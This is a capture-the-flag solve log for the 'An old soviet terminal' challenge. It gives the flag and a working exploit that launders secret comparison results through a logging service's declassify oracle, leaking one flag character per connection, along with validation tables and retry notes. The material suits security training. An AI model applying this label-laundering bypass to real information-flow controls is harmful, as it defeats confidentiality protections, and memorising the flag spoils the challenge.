# An old soviet terminal

- challenge_id: 8
- Category: Misc
- Points: 1000
- Challenge URL: https://ctfd.nusgreyhats.org/challenges#An old soviet terminal-8
- Submit: `POST /api/v1/challenges/attempt` body `{"challenge_id": 8, "submission": "grey{...}"}`
- Connection: nc challs.nusgreyhats.org 36167
- Solved (initial scan): True — `grey{Th3_w4l1S_h4v3_E4r5}` (CTFd: Correct)

## Files
| name | sha256 | size |
|------|--------|------|
| dist-an-old-soviet-terminal.zip | 0856959310d31c8b0f5271a3e03273fa49495d0b24e255311acd0ed785948fae | 1373 |

## Description (verbatim from CTFd)

Our analysts discovered a forgotten server that is still operational on an obscure subnet. It seems to be an old decommissioned Soviet-era intelligence network that never got shut down. 



The system runs an archaic scripting environment with a "compartmentalization protocol" that restricts information flow. Somewhere in its memory, there seems to be a TOPSECRET transmission that was forgotten.



The server doesn't seem very reliable, but do your best to extract it.



Hint: Interact with available services using `send([serviceName], [data])`

eg. `send(analysisService, ("analyze", self()));`

## Flag attempts
| timestamp | flag | verdict | submitted_by |
|-----------|------|---------|--------------|
| 2026-05-30 | `grey{Th3_w4l1S_h4v3_E4r5}` | Correct (already_solved) | extract.rs auto-submit |

## Solution
- flag: `grey{Th3_w4l1S_h4v3_E4r5}`  ("The walls have ears", leet)
- method (one line): IFC label-laundering — `compare(i,ch)` returns a SECRET equality bool, launder it PUBLIC through `logService`'s declassify oracle WITHOUT branching, then branch; leak **one flag index per connection** (W=1) so the program finishes inside the terminal's ~2000ms self-kill; reassemble 25 chars across 133 connections.
- solve dir: `solve/` (`validate.rs` = primitive ladder, `extract.rs` = one-index-per-conn extractor)
- solved at: 2026-05-30

### The exploit (compare-oracle laundering) — every primitive now PROVEN
Submit this as the `retriever()` body (menu `4`, code, `EOF`). It leaks **one flag index per connection** (W=1) so the program finishes inside the terminal's ~2000ms self-kill; reassemble across connections.
```
let val cs="_etaoinshrdlcumwfgypbvkjxqz0123456789{}-!?.+=*ABCDEFGHIJKLMNOPQRSTUVWXYZ"
fun a j=substring(cs,j,j+1)
fun p i d=(send(analysisService,("compare",self(),i,d));receive[hn("comparison",s)=>(send(logService,("log",self(),s));receive[hn("logged",b)=>b])])
fun sc i j=if a j="" then "?" else if p i(a j)then a j else sc i(j+1)
in sc IDX 0 end
```
- `compare(i,ch)` returns a SECRET equality bool (never declassified by the service).
- `p` sends that bool to `logService` (the declassify oracle) WITHOUT branching → pc stays LOW → receive the PUBLIC laundered bool → only then branch. **This is the whole trick.**
- freq-ordered `cs` → real chars match in few compares (cheap, fits budget).
- `analyze` once → declassified length = **25** (so prefix `grey{` 0..4 + 19 interior + `}` 24).

Why NOT a 1-shot dump: `retriever()`'s scope = `{tid, logService, analysisService}` only. `transmission` is captured inside the receiver's closure, never in our lexical scope — equality oracle is the only leak.

### Piece-meal primitive validation (2026-05-30, `solve/validate.rs`) — ALL GREEN
Each rung adds ONE primitive on top of the previous and returns a PUBLIC constant, fired up to 4× (break on first `Message:`), `BUSY`/`ERROR`/`TIMEOUT` retried:

| rung | new primitive tested | expect | verdict | value |
|------|----------------------|--------|---------|-------|
| T0 const | terminal runs our code at all (no services) | `AAAA` | ✅ MESSAGE | `AAAA` |
| T1 analyze | handshake + `analysisService` "analyze" replies | `ANA` | ✅ MESSAGE | `ANA` |
| T1b length | declassified length usable as public int | `#×len` | ✅ MESSAGE | `######…` = **25** |
| T2 compare | `analysisService` "compare" replies (secret bool) | `CMP` | ✅ MESSAGE | `CMP` |
| T3 log | `logService` declassifies + replies (no branch) | `LOG` | ✅ MESSAGE | `LOG` |
| T4 launder | branch on the DECLASSIFIED bool (the leak) | `Y/N` | ✅ MESSAGE | `Y` |
| T5 char0 | full charset scan at idx 0 | `g` | ✅ MESSAGE | `g` |

**Conclusion: the chain works end-to-end.** T5 recovered the real first flag char `g` via the full IFC bypass. The earlier "never once observed `Message:`" was a WRONG conclusion: not an unfixable upstream rendezvous wall — just **program LENGTH**. A whole-flag retriever does ~25×~75 = thousands of cross-node round-trips and dies (`ERROR`) before finishing; a single-index scan finishes in time and returns `Message:`. The fix is purely sizing the program down.

### Server verdicts (4 classes, by distinct emitted string — see `validate.rs:verdict()`)
| marker string | class | meaning |
|---|---|---|
| `Message: <x>` | **MESSAGE** | program returned a value (the result/flag) |
| `[BUSY] Transmission queue is full…` | **BUSY** | server overloaded, bounced *before* our code ran — NOT a code failure; retry |
| `[TIMEOUT] … terminated after 10 seconds` | **TIMEOUT** | 10s server wrapper hard-kill |
| `[ERROR] Program terminated abnormally` | **ERROR** | troupe process crashed / 2000ms self-kill (race; hits trivial `"AAAA"` too) |
| (TCP `connect`/`write` errors out) | refused | RST / conn cap — transient |

Per-connection success is intermittent (~1 in 1–4 lands `MESSAGE`; rest are `ERROR`/`BUSY`), so the extractor just retries each index until it lands.

### Status (2026-05-30) — extracting
- transport: connect → menu → `4` → script → `EOF`. MUST be **staged** (send `4`, wait `>>`, then code+`EOF`). Result frame teletype-renders up to ~11s after `EOF`; drain ≥14s, early-exit on frame header.
- **active solver = `solve/extract.rs`** (W=1, one index per connection, freq-ordered charset, `BUSY`-aware retry, persists each char to `extract_progress.txt`, drops `flag.txt` + auto-stops at 25). Seeded `grey{`, scans idx 5→24.
- `solve/validate.rs` = the piece-meal ladder above. Older whole-flag/window hunters (`probe.rs`, `hunt.rs`, `full_attack.rs`, `run24h.sh`, py diagnostics) → `solve/archive/` (superseded once length was the proven cause).

## troubleshoots
- Terminal limits script to 600 bytes: `[SYSTEM] Program exceeds maximum allocation (600 bytes).`
- `[TIMEOUT] ... terminated after 10 seconds` = run hit the 10s wrapper; `[ERROR] terminated abnormally` = troupe died early (2000ms self-kill race — hits trivial `"AAAA"` ~3/4 too, so retry). `[BUSY] Transmission queue is full` = server saturated, bounced before our code ran — retry with backoff. The result frame renders 2–11s after EOF, so drain ≥14s or you miss it. **Program SIZE is the real lever:** keep each program to ~1 leaked index so it finishes before the self-kill (validated — see status above).
- `intToString` is NOT a builtin here. Return strings via `^`-concat / `substring(cs,k,k+1)` only.
- `ConnectionRefused` (RST) = box at process cap → transient. Retry fast; RST costs the box nothing.
